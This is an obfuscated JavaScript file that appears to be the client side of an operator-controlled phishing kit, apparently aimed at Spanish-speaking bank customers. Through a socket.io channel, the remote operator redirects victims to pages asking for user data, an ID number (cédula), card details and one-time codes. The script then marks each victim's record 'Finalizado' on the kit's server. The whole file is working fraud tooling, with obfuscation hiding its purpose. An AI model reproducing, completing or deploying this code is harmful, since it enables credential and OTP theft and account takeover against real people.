const _0x13c6c6 = _0xe8b8;
function _0x4dce() {
  const _0x367d05 = [
    "log",
    "checkerInfo",
    "/trico/tricofinish/",
    "./cdin.error.html",
    "metaInfo",
    "json",
    "mode",
    "trico",
    "href",
    "503760ulEBYv",
    "./error.cedula.html",
    "7VjQdVU",
    "newOtp",
    "1600181asNMeI",
    "Usuario\x20encontrado",
    "mano",
    "1037952sPVwMI",
    "stringify",
    "Finalizado",
    "86528aoICyk",
    "25UQyazX",
    "connect",
    "location",
    "PUT",
    "17qYXWZQ",
    "12226zHWtRa",
    "GET",
    "144276cCXFcQ",
    "telnum",
    "finish",
    "20omnTLX",
    "valor",
    "1009395bRjENH",
    "valid",
  ];
  _0x4dce = function () {
    return _0x367d05;
  };
  return _0x4dce();
}
function _0xe8b8(_0x10933a, _0x720385) {
  const _0x4dcee9 = _0x4dce();
  return (
    (_0xe8b8 = function (_0xe8b834, _0x1f4a5f) {
      _0xe8b834 = _0xe8b834 - 0x15a;
      let _0x35492a = _0x4dcee9[_0xe8b834];
      return _0x35492a;
    }),
    _0xe8b8(_0x10933a, _0x720385)
  );
}
(function (_0x2626f9, _0x599240) {
  const _0x1cf454 = _0xe8b8,
    _0x3084e2 = _0x2626f9();
  while (!![]) {
    try {
      const _0x4879e5 =
        (-parseInt(_0x1cf454(0x163)) / 0x1) *
          (parseInt(_0x1cf454(0x164)) / 0x2) +
        parseInt(_0x1cf454(0x176)) / 0x3 +
        (-parseInt(_0x1cf454(0x166)) / 0x4) *
          (-parseInt(_0x1cf454(0x15f)) / 0x5) +
        -parseInt(_0x1cf454(0x15b)) / 0x6 +
        (parseInt(_0x1cf454(0x178)) / 0x7) *
          (-parseInt(_0x1cf454(0x15e)) / 0x8) +
        (parseInt(_0x1cf454(0x16b)) / 0x9) *
          (parseInt(_0x1cf454(0x169)) / 0xa) +
        -parseInt(_0x1cf454(0x17a)) / 0xb;
      if (_0x4879e5 === _0x599240) break;
      else _0x3084e2["push"](_0x3084e2["shift"]());
    } catch (_0x45e07f) {
      _0x3084e2["push"](_0x3084e2["shift"]());
    }
  }
})(_0x4dce, 0x2206f);
var socket = io[_0x13c6c6(0x160)](url);
socket["on"](_0x13c6c6(0x174), function (_0x457f4e) {
  const _0x43a7c1 = _0x13c6c6;
  if (_0x457f4e[_0x43a7c1(0x16a)] == "user") {
    if (
      info[_0x43a7c1(0x16e)][_0x43a7c1(0x173)] == "personas" &&
      _0x457f4e[_0x43a7c1(0x16c)] == info[_0x43a7c1(0x171)]["telnum"]
    )
      window[_0x43a7c1(0x161)]["href"] = "./error.user.html";
    else
      info[_0x43a7c1(0x16e)][_0x43a7c1(0x173)] == _0x43a7c1(0x15a) &&
        _0x457f4e["valid"] == info[_0x43a7c1(0x171)][_0x43a7c1(0x167)] &&
        (window[_0x43a7c1(0x161)][_0x43a7c1(0x175)] = _0x43a7c1(0x177));
  } else {
    if (
      _0x457f4e[_0x43a7c1(0x16a)] == "otp" &&
      _0x457f4e[_0x43a7c1(0x16c)] == info[_0x43a7c1(0x171)][_0x43a7c1(0x167)]
    )
      window[_0x43a7c1(0x161)][_0x43a7c1(0x175)] = "./cdin.html";
    else {
      if (
        _0x457f4e[_0x43a7c1(0x16a)] == _0x43a7c1(0x179) &&
        _0x457f4e[_0x43a7c1(0x16c)] == info[_0x43a7c1(0x171)][_0x43a7c1(0x167)]
      )
        window[_0x43a7c1(0x161)][_0x43a7c1(0x175)] = _0x43a7c1(0x170);
      else {
        if (
          _0x457f4e["valor"] == _0x43a7c1(0x168) &&
          _0x457f4e["valid"] == info["metaInfo"][_0x43a7c1(0x167)]
        ) {
          async function _0x92b4e3() {
            const _0x23b5cf = _0x43a7c1,
              _0x299120 = await fetch(url + "/trico/tricoData", {
                method: _0x23b5cf(0x165),
                headers: { "Content-Type": "application/json" },
              }),
              _0x560af2 = await _0x299120[_0x23b5cf(0x172)](),
              _0x4253e3 = [..._0x560af2];
            for (const _0x23828b of _0x4253e3) {
              if (
                _0x23828b[_0x23b5cf(0x16c)] ==
                info["metaInfo"][_0x23b5cf(0x167)]
              ) {
                console[_0x23b5cf(0x16d)](_0x23b5cf(0x17b));
                const _0x54069f = await fetch(
                    url + _0x23b5cf(0x16f) + _0x23828b["idreg"],
                    {
                      method: _0x23b5cf(0x162),
                      headers: { "Content-Type": "application/json" },
                      body: JSON[_0x23b5cf(0x15c)]({
                        estado: _0x23b5cf(0x15d),
                      }),
                    }
                  ),
                  _0x41abe2 = await _0x54069f[_0x23b5cf(0x172)]();
              }
            }
            window["location"][_0x23b5cf(0x175)] = "./finalizado.html";
          }
          _0x92b4e3();
        }
      }
    }
  }
});
